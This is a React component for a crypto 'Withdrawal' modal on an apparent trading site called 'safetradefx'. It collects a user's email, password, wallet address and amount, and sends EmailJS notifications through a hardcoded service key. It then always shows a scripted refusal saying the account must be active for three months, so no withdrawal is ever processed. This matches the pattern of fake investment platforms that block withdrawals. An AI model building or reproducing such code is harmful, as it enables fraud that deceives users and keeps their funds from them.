import React, { useState } from "react";
import emailjs from "emailjs-com";
import Modal from "@mui/material/Modal";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";

const FormModal = ({ open, handleClose, coinType }) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wallet, setWallet] = useState("");
  const [amount, setAmount] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Send transaction request confirmation email to the registered email
      await emailjs.send(
        "payout_safetradefx",
        "template_9vpl2ia",
        {
          email: email,
          coinType: coinType,
          amount: amount,
          year: new Date().getFullYear(),
        },
        "6_kKoseNaTUNdJbv3"
      );

      // Send transaction request confirmation email to the user's email
      await emailjs.send(
        "payout_safetradefx",
        "template_9vpl2ia",
        {
          email: email,
          coinType: coinType,
          amount: amount,
          year: new Date().getFullYear(),
        },
        "6_kKoseNaTUNdJbv3"
      );

      // Show success message
      handleClose();
      alert("You will get a mail soon regarding your transaction.");
      alert(
        `sorry , user with email of :${email}, your amount: ${amount} was not able to be processed. Your account has to be active for about 3 months with steady transaction`
      );
      window.location.reload();

      //   Optionally send a failure email to the registered email if needed
      //   Uncomment if you need to notify the admin of a failure
      await emailjs.send(
        "payout_safetradefx",
        "template_9vpl2ia",
        {
          amount: amount,
          year: new Date().getFullYear(),
        },
        "6_kKoseNaTUNdJbv3"
      );
    } catch (error) {
      console.error("Error sending email", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal
      open={open}
      onClose={handleClose}
      aria-labelledby="modal-title"
      aria-describedby="modal-description"
    >
      <Box className="bg-[#202b5d] p-6 rounded-md w-1/3 m-auto mt-24">
        <h2 className="text-white text-xl mb-4">{coinType} Withdrawal</h2>
        <form onSubmit={handleSubmit} className="space-y-4">
          <TextField
            name="email"
            label="Email"
            variant="outlined"
            fullWidth
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <TextField
            name="password"
            label="Password"
            variant="outlined"
            type="password"
            fullWidth
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <TextField
            name="wallet"
            label="Wallet Address"
            variant="outlined"
            fullWidth
            required
            value={wallet}
            onChange={(e) => setWallet(e.target.value)}
          />
          <TextField
            name="amount"
            label="Amount to Withdraw"
            variant="outlined"
            type="number"
            fullWidth
            required
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />
          <Button
            type="submit"
            variant="contained"
            color="primary"
            className="bg-[#609c46]"
            disabled={loading}
          >
            {loading ? "Processing..." : "Submit"}
          </Button>
        </form>
      </Box>
    </Modal>
  );
};

export default FormModal;
